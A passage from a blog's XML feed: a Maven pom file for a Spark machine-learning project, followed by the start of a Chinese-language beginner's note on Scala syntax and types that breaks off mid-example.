class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>SparkML<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>SparkML<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">repositories</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>Akka repository<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://repo.akka.io/releases<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">repositories</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">sourceDirectory</span>&gt;</span>src/main/scala/<span class="tag">&lt;/<span class="name">sourceDirectory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">testSourceDirectory</span>&gt;</span>src/test/scala/<span class="tag">&lt;/<span class="name">testSourceDirectory</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.scala-tools<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-scala-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>testCompile<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">scalaVersion</span>&gt;</span>2.11.4<span class="tag">&lt;/<span class="name">scalaVersion</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-shade-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>shade<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">filters</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">artifact</span>&gt;</span>*:*<span class="tag">&lt;/<span class="name">artifact</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">excludes</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/*.SF<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/*.DSA<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/*.RSA<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">excludes</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">filters</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">transformers</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                                <span class="tag">&lt;<span class="name">transformer</span></span></span><br><span class="line"><span class="tag">                                        <span class="attr">implementation</span>=<span class="string">"org.apache.maven.plugins.shade.resource.AppendingTransformer"</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">resource</span>&gt;</span>reference.conf<span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">transformer</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                                <span class="tag">&lt;<span class="name">transformer</span></span></span><br><span class="line"><span class="tag">                                        <span class="attr">implementation</span>=<span class="string">"org.apache.maven.plugins.shade.resource.ManifestResourceTransformer"</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">Main-Class</span>&gt;</span><span class="tag">&lt;/<span class="name">Main-Class</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">transformer</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">transformers</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-core_2.11<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-hive_2.11<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hadoop<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hadoop-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-streaming_2.11<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-sql_2.11<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hive<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hive-exec<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hive<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hive-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>redis.clients<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jedis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">type</span>&gt;</span>jar<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&lt;dependency&gt;</span></span><br><span class="line"><span class="comment">            &lt;groupId&gt;org.apache.hbase&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">            &lt;artifactId&gt;hbase-client&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">            &lt;version&gt;1.2.1&lt;/version&gt;</span></span><br><span class="line"><span class="comment">        &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">            &lt;groupId&gt;org.apache.hbase&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">            &lt;artifactId&gt;hbase-common&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">            &lt;version&gt;1.2.1&lt;/version&gt;</span></span><br><span class="line"><span class="comment">        &lt;/dependency&gt;--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&lt;dependency&gt;</span></span><br><span class="line"><span class="comment">            &lt;groupId&gt;org.apache.kafka&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">            &lt;artifactId&gt;kafka-clients&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">            &lt;version&gt;0.8.2.2&lt;/version&gt;</span></span><br><span class="line"><span class="comment">        &lt;/dependency&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.37<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--&lt;dependency&gt;</span></span><br><span class="line"><span class="comment">            &lt;groupId&gt;org.apache.kafka&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">            &lt;artifactId&gt;kafka_2.11&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">            &lt;version&gt;0.8.2.2&lt;/version&gt;</span></span><br><span class="line"><span class="comment">        &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">            &lt;groupId&gt;org.apache.spark&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">            &lt;artifactId&gt;spark-streaming-kafka_2.11&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">            &lt;version&gt;2.2.1&lt;/version&gt;</span></span><br><span class="line"><span class="comment">        &lt;/dependency&gt; --&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-mllib_2.11<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;SparkML也是个大坑，先在这里贴上pom文件&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Reading notes" scheme="http://yoursite.com/categories/Reading-notes/"/>
    
      <category term="Spark机器学习案例实战" scheme="http://yoursite.com/categories/Reading-notes/Spark%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A1%88%E4%BE%8B%E5%AE%9E%E6%88%98/"/>
    
    
      <category term="Reading notes" scheme="http://yoursite.com/tags/Reading-notes/"/>
    
      <category term="Mechine Learning" scheme="http://yoursite.com/tags/Mechine-Learning/"/>
    
  </entry>
  
  <entry>
    <title>Scala Note</title>
    <link href="http://yoursite.com/2019/06/18/Scala%20Note/"/>
    <id>http://yoursite.com/2019/06/18/Scala Note/</id>
    <published>2019-06-18T07:40:44.186Z</published>
    <updated>2019-08-16T08:06:13.674Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>开一个新坑，Scala这门语言在优化上有很大的操作余地，需要相当的熟练度。本文仅做基础笔记的整理。</p></blockquote><a id="more"></a> <h1 id="Scala"><a href="#Scala" class="headerlink" title="Scala"></a>Scala</h1><h2 id="Scala-介绍"><a href="#Scala-介绍" class="headerlink" title="Scala 介绍"></a>Scala 介绍</h2><p>Scala 是 Scalable Language 的简写，是一门多范式的编程语言</p><p>联邦理工学院洛桑（EPFL）的Martin Odersky于2001年基于Funnel的工作开始设计Scala。</p><p>Funnel是把函数式编程思想和Petri网相结合的一种编程语言。</p><p>Odersky先前的工作是Generic Java和javac（Sun Java编译器）。Java平台的Scala于2003年底/2004年初发布。.NET平台的Scala发布于2004年6月。该语言第二个版本，v2.0，发布于2006年3月。</p><p>截至2009年9月，最新版本是版本2.7.6 。Scala 2.8预计的特性包括重写的Scala类库（Scala collections library）、方法的命名参数和默认参数、包对象（package object），以及Continuation。</p><p>2009年4月，Twitter宣布他们已经把大部分后端程序从Ruby迁移到Scala，其余部分也打算要迁移。此外， Wattzon已经公开宣称，其整个平台都已经是基于Scala基础设施编写的。</p><hr><h2 id="环境部分："><a href="#环境部分：" class="headerlink" title="环境部分："></a>环境部分：</h2><p>安装：和Java一样也要配置环境变量</p><p>配置IDEA：</p><p>先安装插件Scala</p><p>然后创建Maven项目</p><p>因为Maven默认不支持Scala</p><p>创建完毕之后</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3izm7uublj20f30ch0t5.jpg" alt></p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3izmsgpxxj20pw0lnab5.jpg" alt></p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3iznzcv6ej20sw0o13zt.jpg" alt></p><p>Scala文件夹标记为Source</p><h2 id="语法部分"><a href="#语法部分" class="headerlink" title="语法部分"></a>语法部分</h2><h3 id="Hello-Scala"><a href="#Hello-Scala" class="headerlink" title="Hello Scala"></a>Hello Scala</h3><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">HelloScala</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    println(<span class="string">"hello Scala"</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>命令台执行命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scala -cp C:\Users\61661\Desktop\scala-1.0-SNAPSHOT.jar HelloScala</span><br></pre></td></tr></table></figure><h3 id="声明值和变量"><a href="#声明值和变量" class="headerlink" title="声明值和变量"></a>声明值和变量</h3><p>Scala声明变量有两种方式：<code>val</code> 和 <code>var</code></p><p><code>val</code>定义的值是不可变的，它不是一个常量，是不可变量，或者称之为只读变量。</p><p>Tips：</p><ol><li>Scala的匿名变量（为了运行程序，系统自动添加的变量）分配<code>val</code>。</li><li><code>val</code>定义的变量虽然不能改变其引用的内存地址，但是可以改变其引用的对象的内部的其他属性值。</li><li>为了减少可变性引起的bug，应该尽可能地使用不可变变量。变量类型可以省略，解析器会根据值进行推断。<code>val</code>和<code>var</code>声明变量时都必须初始化。</li></ol><h3 id="常用类型"><a href="#常用类型" class="headerlink" title="常用类型"></a>常用类型</h3><p>8种常用类型</p><table><thead><tr><th>类型</th><th>属性</th></tr></thead><tbody><tr><td>Boolean</td><td><code>true</code> 或者 <code>false</code></td></tr><tr><td>Byte</td><td>8位， 有符号</td></tr><tr><td>Short</td><td>16位， 有符号</td></tr><tr><td>Int</td><td>32位， 有符号</td></tr><tr><td>Long</td><td>64位， 有符号</td></tr><tr><td>Char</td><td>16位， 无符号</td></tr><tr><td>Float</td><td>32位， 单精度浮点数</td></tr><tr><td>Double</td><td>64位， 双精度浮点数</td></tr><tr><td>String</td><td>由Char数组组成</td></tr></tbody></table><p>与Java中的数据类型不同，Scala并不区分基本类型和引用类型，所以这些类型<strong>都是对象</strong></p><p>可以调用相对应的方法，String直接使用的是<code>java.lang.String</code></p><p>由于String实际是一系列Char的不可变的集合，Scala中大部分针对集合的操作，都可以用于String，具体来说，String的这些方法存在于类<code>scala.collection.immutable.StringOps</code>中。</p><p>由于String在需要时能隐式转换为<code>StringOps</code>，因此不需要任何额外的转换，String就可以使用这些方法。</p><p>每一种数据类型都有对应的<code>Rich*</code>类型，如<code>RichInt</code>、<code>RichChar</code>等，为基本类型提供了更多的有用操作。</p><h3 id="常用类型结构图"><a href="#常用类型结构图" class="headerlink" title="常用类型结构图"></a>常用类型结构图</h3><p>Scala中，所有的值都是类对象，而所有的类，包括值类型，都最终继承自一个统一的根类型<code>Any</code>。统一类型，是Scala的又一大特点。更特别的是，Scala中还定义了几个底层类<code>Bottom Class</code>，比如<code>Null</code>和<code>Nothing</code>。</p><ol><li><code>Null</code>是所有引用类型的子类型，而<code>Nothing</code>是所有类型的子类型。<code>Null</code>类只有一个实例对象，<code>null</code>，类似于Java中的<code>null</code>引用。<code>null</code>可以赋值给任意引用类型，但是不能赋值给值类型。</li><li><code>Nothing</code>，可以作为没有正常返回值的方法的返回类型，非常直观的告诉你这个方法不会正常返回，而且由于<code>Nothing</code>是其他任意类型的子类，他还能跟要求返回值的方法兼容。</li><li><code>Unit</code>类型用来标识过程，也就是没有明确返回值的函数。 由此可见，<code>Unit</code>类似于<code>Java</code>里的<code>void</code>。<code>Unit</code>只有一个实例，()，这个实例也没有实质的意义。</li></ol><p>关系图：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3jcuo85e8j20of0gtta1.jpg" alt></p><h3 id="算数操作符重载"><a href="#算数操作符重载" class="headerlink" title="算数操作符重载"></a>算数操作符重载</h3><p><code>+</code> <code>-</code> <code>*</code> <code>/</code> <code>%</code>可以完成和Java中相同的工作，但是有一点区别，他们都是方法。你几乎可以用任何符号来为方法命名。</p><p><code>1 + 2</code> 等同于 <code>1.+(2)</code></p><p>Tips: Scala中没有++、–操作符，需要通过+=、-=来实现同样的效果。</p><h3 id="调用函数与方法"><a href="#调用函数与方法" class="headerlink" title="调用函数与方法"></a>调用函数与方法</h3><p>在Scala中，一般情况下我们不会刻意的去区分<code>函数</code>与<code>方法</code>的区别，但是他们确实是不同的东西。</p><p>后面我们再详细探讨。首先我们要学会使用Scala来调用函数与方法。</p><h4 id="1-调用函数，求方根"><a href="#1-调用函数，求方根" class="headerlink" title="1.调用函数，求方根"></a>1.调用函数，求方根</h4><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scala.math</span><br><span class="line">sqrt(<span class="number">100</span>)</span><br></pre></td></tr></table></figure><h4 id="2-调用方法，静态方法（Scala中没有静态方法这个概念，需要通过伴生类对象来实现）"><a href="#2-调用方法，静态方法（Scala中没有静态方法这个概念，需要通过伴生类对象来实现）" class="headerlink" title="2.调用方法，静态方法（Scala中没有静态方法这个概念，需要通过伴生类对象来实现）"></a>2.调用方法，静态方法（Scala中没有静态方法这个概念，需要通过伴生类对象来实现）</h4><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BigInt</span>.probablePrime(<span class="number">16</span>, scala.util.<span class="type">Random</span>)</span><br></pre></td></tr></table></figure><h4 id="3-调用方法，非静态方法，使用对象调用"><a href="#3-调用方法，非静态方法，使用对象调用" class="headerlink" title="3.调用方法，非静态方法，使用对象调用"></a>3.调用方法，非静态方法，使用对象调用</h4><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"HelloWorld"</span>.distinct</span><br></pre></td></tr></table></figure><h4 id="4-apply与update方法"><a href="#4-apply与update方法" class="headerlink" title="4.apply与update方法"></a>4.apply与update方法</h4><p>apply方法是调用时可以省略方法名的方法。用于构造和获取元素：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"Hello"</span>(<span class="number">4</span>)  等同于  <span class="string">"Hello"</span>.apply(<span class="number">4</span>)</span><br><span class="line"><span class="type">Array</span>(<span 